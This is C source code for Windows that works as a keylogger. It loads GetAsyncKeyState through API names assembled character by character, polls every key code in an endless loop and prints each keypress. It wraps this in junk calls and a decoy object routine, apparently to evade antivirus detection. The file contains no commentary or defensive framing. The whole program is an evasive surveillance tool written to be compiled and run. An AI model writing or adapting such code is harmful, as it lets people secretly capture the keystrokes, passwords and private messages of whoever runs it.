#include <windows.h>

#include "object.h"

void junkC();

typedef SHORT(WINAPI* GetAsyncKeyState_t)(int);

GetAsyncKeyState_t ps = NULL;

#define ALWS ((~0) != 0)
#define SLEP ((1 << 2) + 1)

void api() {
    char lib[]  = { 'u','s','e','r','3','2','.','d','l','l',0 };
    char p1[]   = { 'G','e','t','A','s','y','n','c',0 };
    char p2[]   = { 'K','e','y','S','t','a','t','e',0 };
    char func[32];

    strcpy(func, p1);
    strcat(func, p2);

    HMODULE u3 = LoadLibraryA(lib);

    if (!u3) {
        return;
    }

    ps = (GetAsyncKeyState_t)GetProcAddress(u3, func);

    if (!ps) {
        return;
    }
}

int start()
{   return 2 * 4;  }

int end() 
{   return (0x100 - 1);  }

void gtkys() {
    if (!ps) return;

    for (int g = start(); g <= end(); g++)
    {
        SHORT state = ps(g);

        if ((state & 1) != 0) {
            printf("%d (%c)\n", g, (char)g);
        }
    }
}

int isact() {
    return !!ps;
}

void lop() {
    void (*func)() = gtkys;

    for (int dummy = 0; ALWS; dummy ^= dummy) {
        if (isact()) {
            func();
        }
        Sleep(SLEP);
    }
}

int main() {
    api();

    srand((unsigned)time(NULL));

    int type = rand() % 2;
    Object* obj = create_object(type);

    junkC();

    for (int i = 0; i < 5; i++) {
        obj->vtable->process(obj->data, i * 3);
        junkC();
    }

    destroy_object(obj);

    lop();
}